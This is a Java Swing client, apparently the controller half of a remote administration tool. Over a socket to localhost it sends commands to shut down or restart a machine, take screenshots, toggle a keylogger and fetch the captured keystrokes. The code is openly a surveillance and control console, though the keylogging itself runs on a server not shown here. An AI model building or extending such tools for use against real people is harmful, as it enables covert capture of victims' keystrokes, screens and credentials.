import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.net.Socket;
import java.nio.file.*;

public class RemoteClientGUI extends JFrame {
    private Socket socket;
    private BufferedReader reader;
    private PrintWriter writer;
    private JTextArea textArea;
    private JTextField fileNameField;
    private JButton shutdownButton, restartButton, cancelButton, screenshotButton, exitButton, keyloggerButton, getKeyLogsButton;

    public RemoteClientGUI() {
        
        setTitle("Remote Client");
        setSize(400, 300);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);

        setLayout(new BorderLayout());

     
        textArea = new JTextArea(10, 30);
        textArea.setEditable(false);
        JScrollPane scrollPane = new JScrollPane(textArea);
        add(scrollPane, BorderLayout.CENTER);

        
        JPanel panel = new JPanel();
        panel.setLayout(new GridLayout(7, 1));

        shutdownButton = new JButton("Shutdown");
        restartButton = new JButton("Restart");
        cancelButton = new JButton("Cancel Shutdown");
        screenshotButton = new JButton("Screenshot");
        keyloggerButton = new JButton("Toggle Keylogger");
        getKeyLogsButton = new JButton("Get Key Logs");
        exitButton = new JButton("Exit");

        panel.add(shutdownButton);
        panel.add(restartButton);
        panel.add(cancelButton);
        panel.add(screenshotButton);
        panel.add(keyloggerButton);
        panel.add(getKeyLogsButton);
        panel.add(exitButton);

        add(panel, BorderLayout.WEST);

       
        fileNameField = new JTextField(20);
        fileNameField.setVisible(false);
        panel.add(fileNameField);

       
        shutdownButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                sendCommand("shutdown");
            }
        });

        restartButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                sendCommand("restart");
            }
        });

        cancelButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                sendCommand("cancel");
            }
        });

        screenshotButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                sendCommand("screenshot");
            }
        });

        keyloggerButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                sendCommand("keylogger");
            }
        });

        getKeyLogsButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                sendCommand("getKeyLogs");
            }
        });

        exitButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                try {
                    if (socket != null && !socket.isClosed()) {
                        socket.close();
                    }
                    System.exit(0);
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
        });
    }

   
    private void connectToServer() {
        try {
            socket = new Socket("localhost", 5000);
            reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            writer = new PrintWriter(socket.getOutputStream(), true);
            textArea.append("Connected to server\n");
        } catch (IOException e) {
            e.printStackTrace();
            textArea.append("Error: Unable to connect to server\n");
        }
    }

   
    private void sendCommand(String command) {
        try {
            writer.println(command);
            writer.flush();

            String response = reader.readLine();
            textArea.append("Server response: " + response + "\n");

            if (command.equals("screenshot")) {
               
                int imageSize = Integer.parseInt(reader.readLine());
                byte[] imageBytes = new byte[imageSize];
                int bytesRead = socket.getInputStream().read(imageBytes);

                if (bytesRead > 0) {
                    String fileName = JOptionPane.showInputDialog(this, "Enter file name for screenshot:");
                    if (fileName != null && !fileName.isEmpty()) {
                        Path imagePath = Paths.get(fileName + ".png");

                        Files.write(imagePath, imageBytes);
                        textArea.append("Image saved to: " + imagePath + "\n");
                    } else {
                        textArea.append("No file name provided. Image not saved.\n");
                    }
                } else {
                    textArea.append("Failed to receive image from server.\n");
                }
            }

            if (command.equals("getKeyLogs")) {
               
                StringBuilder logs = new StringBuilder();
                String logLine;
                while ((logLine = reader.readLine()) != null) {
                    logs.append(logLine).append("\n");
                }
                textArea.append("Keylogs:\n" + logs.toString());
            }

        } catch (IOException e) {
            e.printStackTrace();
            textArea.append("Error sending command to server\n");
        }
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                RemoteClientGUI clientGUI = new RemoteClientGUI();
                clientGUI.setVisible(true);
                clientGUI.connectToServer();
            }
        });
    }
}

